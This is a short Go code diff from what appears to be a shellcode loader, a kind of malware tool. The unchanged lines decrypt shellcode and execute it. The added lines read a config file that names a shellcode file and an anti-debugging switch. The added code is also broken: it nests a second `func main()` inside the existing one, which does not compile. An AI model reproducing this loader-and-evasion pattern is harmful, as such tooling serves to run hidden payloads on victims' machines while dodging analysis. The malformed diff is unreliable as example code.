@@ -39,4 +39,16 @@ func main() {
 	shellcode_loader.ExecuteShellcode(decryptedShellcode)
 
 	fmt.Println("Execution completed successfully.")
+
+	func main() {
+	// Load config
+	config, err := utils.LoadConfig("config/settings.json")
+	if err != nil {
+		fmt.Println("[-] Failed to load configuration. Using defaults...")
+		return
+	}
+
+	// Access config values
+	fmt.Println("Shellcode File:", config.Shellcode.File)
+	fmt.Println("Enable Anti-Debugging:", config.EnableAntiDebugging)
 }
